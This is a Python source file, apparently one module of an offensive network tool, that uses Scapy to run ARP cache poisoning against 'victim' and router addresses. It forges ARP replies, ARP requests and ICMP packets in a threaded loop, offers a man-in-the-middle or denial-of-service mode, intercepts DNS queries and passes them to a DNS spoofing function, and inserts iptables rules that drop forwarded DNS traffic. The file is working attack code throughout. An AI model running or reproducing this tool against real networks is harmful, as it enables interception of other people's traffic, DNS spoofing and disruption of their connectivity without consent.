from scapy.all import *
from Forward import *
from Setup import *
from DNS import *
import threading
from config import config
from discovery import ip_mac_cache

# Forges an ICMP echo request, used for Solaris systems
# Creates an ARP entry for the [src_ip] on the destination device
def forge_icmp_echo_request(src_ip, dst_ip, dst_mac):
	return Ether(dst=dst_mac) / IP(src=src_ip, dst=dst_ip) / ICMP(type="echo-request")

# Forges an ARP reply
def forge_arp_reply(src_ip, src_mac, dst_ip, dst_mac):
	return Ether(dst=dst_mac) / ARP(
		op=2,
		psrc=src_ip,
		pdst=dst_ip,
		hwsrc=src_mac,
		hwdst=dst_mac
	)

# Forges an ARP request, used for linux kernel 2.4.x
# Sends a spoofed ARP request to create an entry in the cache
def forge_arp_request(src_ip, src_mac, dst_ip, dst_mac):
	return Ether(dst=dst_mac) / ARP(
		op=1,
		psrc=src_ip,
		pdst=dst_ip,
		hwsrc=src_mac,
		hwdst="00:00:00:00:00:00"
	)
	
def poison_loop(forged_packets, interface, iterations, stop_event):
	i = 1
	# Repeatedly sends each forged response at once and then sleeps for [interval] seconds
	while not stop_event.is_set() and (iterations == 0 or i <= iterations):
		# Send packets based on the config settings
		print("Sending poison packets...")
		sendp(forged_packets, iface=interface, verbose=False)

		# For the first 5 poison batches use the warm up delay
		if i < 5:
			# Check if thread should stop every 1 second
			for j in range(config.arp.poison_warm_up):
				time.sleep(1)
				if stop_event.is_set():
					return
		else:
			# Check if thread should stop every 1 second
			for j in range(config.arp.poison_delay):
				time.sleep(1)
				if stop_event.is_set():
					return
		i += 1
	
def start_arp_mitm(group1, group2, self_mac, interface):
	# create a list of each forged responses
	# every device in group1 gets the devices in group2 spoofed by this device
	# if one way poisoning is not enabled, then the other way around as well
	forged_packets = []

	for (ip1, mac1) in group1:
		for (ip2, mac2) in group2:
			if (ip1, mac1) != (ip2, mac2):
				# ICMP echo request
				if config.arp.poison_icmp:
					forged_packets.append(forge_icmp_echo_request(ip2, ip1, mac1))
					if not config.arp.poison_oneway:
						forged_packets.append(forge_icmp_echo_request(ip1, ip2, mac2))

				# ARP reply
				if config.arp.poison_reply:
					forged_packets.append(forge_arp_reply(ip2, self_mac, ip1, mac1))
					if not config.arp.poison_oneway:
						forged_packets.append(forge_arp_reply(ip1, self_mac, ip2, mac2))

				# ARP request
				if config.arp.poison_request:
					forged_packets.append(forge_arp_request(ip2, self_mac, ip1, mac1))
					if not config.arp.poison_oneway:
						forged_packets.append(forge_arp_request(ip1, self_mac, ip2, mac2))

	# event to signal that the poison_loop thread should stop
	stop_event = threading.Event()

	thread = threading.Thread(target=poison_loop, args=(forged_packets, interface, 0, stop_event), daemon=True)

	thread.start()

	return thread, stop_event

def stop_arp_poison(thread, group1, group2, stop_event, interface):
	print("Stopping ARP poisoning thread...")
	# signal the poison thread to stop
	stop_event.set()
	thread.join()

	# create forged packets to restore the arp tables of the victims to the valid values
	forged_packets = []

	for (ip1, mac1) in group1:
		for (ip2, mac2) in group2:
			if (ip1, mac1) != (ip2, mac2):
				# ARP reply
				if config.arp.poison_reply:
					forged_packets.append(forge_arp_reply(ip2, mac2, ip1, mac1))
					if not config.arp.poison_oneway:
						forged_packets.append(forge_arp_reply(ip1, mac1, ip2, mac2))

				# ARP request
				if config.arp.poison_request:
					forged_packets.append(forge_arp_request(ip2, mac2, ip1, mac1))
					if not config.arp.poison_oneway:
						forged_packets.append(forge_arp_request(ip1, mac1, ip2, mac2))

	print("Re-poisoning the victims to restore the valid ARP entries...")
	# create a new stop_event for the repoisoning
	stop_event = threading.Event()
	# run the poison loop 3 times to restore the valid entries
	poison_loop(forged_packets, interface, 3, stop_event)

# Gets the mac of the given ip by sending an arp broadcast
def get_mac(ip, iface):
	# If the ip mac pair is cached return it
	if ip in ip_mac_cache:
		return ip_mac_cache[ip]
	
	ans, _ = srp(
		Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
		iface=iface,
		timeout=2,
		verbose=False
	)
	for _, rcv in ans:
		mac = rcv[ARP].hwsrc
		ip_mac_cache[ip] = mac
		return mac
	return None

# Forwards a packet towards the destination by reconstructing its ethernet layer
def forward_dns_pkt(pkt):
	dst = pkt[IP].dst
	iface, _, gw = conf.route.route(dst)
	next_hop = dst if gw == "0.0.0.0" else gw

	mac = get_mac(next_hop, iface)
	if mac is None:
		return
	
	eth = Ether(src=get_if_hwaddr(iface), dst=mac)
	sendp(eth / pkt[IP], iface=iface)
	
# Filter for non-replayed DNS packets
def only_dns_request(pkt, self_mac):
	return (
	pkt.haslayer(DNS) and
		pkt[Ether].src != self_mac
	)

def print_fn(pkt, interface):
	if (pkt[DNS].qr == 0):
		if not spoof_dns(pkt, interface):
			forward_dns_pkt(pkt)
	else:
		forward_dns_pkt(pkt)
	print(f"src: {pkt[Ether].src}")
	print(f"summary: {pkt.summary()}")

def drop_port_53():
	run("iptables -I FORWARD -p udp --dport 53 -j DROP")
	run("iptables -I FORWARD -p tcp --dport 53 -j DROP")

def allow_port_53():
	run("iptables -D FORWARD -p udp --dport 53 -j DROP")
	run("iptables -D FORWARD -p tcp --dport 53 -j DROP")
	
def start_attack(group1, group2, self_ip, self_mac, interface):
	if (config.arp.dos_enabled):
		print("Starting DoS attack...")
	else:
		print("Starting MITM attack...")
		enable_kernel_forwarding(interface)

	thread, stop_event = start_arp_mitm(group1, group2, self_mac, interface)

	if not config.arp.dos_enabled and config.dns.enabled:
		drop_port_53()
		intercept_pkts(self_mac, interface, only_dns_request, print_fn)
	else:
		input("\nPress Enter to stop the attack...\n")

	input("\nstop")

	stop_arp_poison(thread, group1, group2, stop_event, interface)
	if not config.arp.dos_enabled and config.dns.enabled:
		allow_port_53()
	cleanup_forward(interface)

# placeholder
victim_ip = "192.168.1.101"
victim_mac = "00:0c:29:d8:3b:bf"
router_ip = "192.168.1.1"
router_mac = "00:0c:29:87:40:17"
self_ip = "192.168.1.100"
self_mac = "00:0c:29:ef:9c:1d"
interface = "eth0"
group1 = [(victim_ip, victim_mac)]
group2 = [(router_ip, router_mac)]

# start the attack with the placeholder values to avoid having to go through discovery every time for testing
# start_attack(group1, group2, self_ip, self_mac, interface)
